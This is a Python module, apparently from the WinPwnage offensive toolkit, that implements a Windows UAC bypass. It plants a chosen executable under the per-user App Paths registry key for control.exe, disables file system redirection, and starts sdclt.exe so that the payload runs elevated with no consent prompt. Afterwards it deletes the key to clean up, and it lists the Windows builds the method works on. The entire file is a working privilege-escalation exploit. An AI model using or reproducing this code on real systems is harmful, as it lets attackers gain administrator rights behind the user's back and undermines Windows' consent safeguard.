from winpwnage.core.prints import *
from winpwnage.core.utils import *
import time
import os

uacMethod6_info = {
	"Description": "UAC bypass using sdclt.exe (App Paths)",
	"Method": "Method: Registry key (App Paths) manipulation",
	"Id": "6",
	"Type": "UAC bypass",
	"Fixed In": "16215" if not information().uac_level() == 4 else "0",
	"Works From": "10240",
	"Admin": False,
	"Function Name": "uacMethod6",
	"Function Payload": True,
}

def uacMethod6_cleanup(path):
	print_info("Performing cleaning")
	if registry().remove_key(hkey="hkcu", path=path, name=None, delete_key=False):
		print_success("Successfully cleaned up")
		print_success("All done!")
	else:
		print_error("Unable to cleanup")
		return False

def uacMethod6(payload):
	if payloads().exe(payload):
		path = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe"

		if registry().modify_key(hkey="hkcu", path=path, name=None, value=payloads().exe(payload)[1], create=True):
			print_success("Successfully created Default key containing payload ({payload})".format(payload=os.path.join(payloads().exe(payload)[1])))
		else:
			print_error("Unable to create registry keys")
			return False

		time.sleep(5)

		print_info("Disabling file system redirection")
		with disable_fsr():
			print_success("Successfully disabled file system redirection")
			if process().create("sdclt.exe"):
				print_success("Successfully spawned process ({})".format(payloads().exe(payload)[1]))
				time.sleep(5)
				uacMethod6_cleanup(path)
			else:
				print_error("Unable to spawn process ({})".format(os.path.join(payloads().exe(payload)[1])))
				for x in Constant.output:
					if "error" in x:
						uacMethod6_cleanup(path)
						return False
	else:
		print_error("Cannot proceed, invalid payload")
		return False
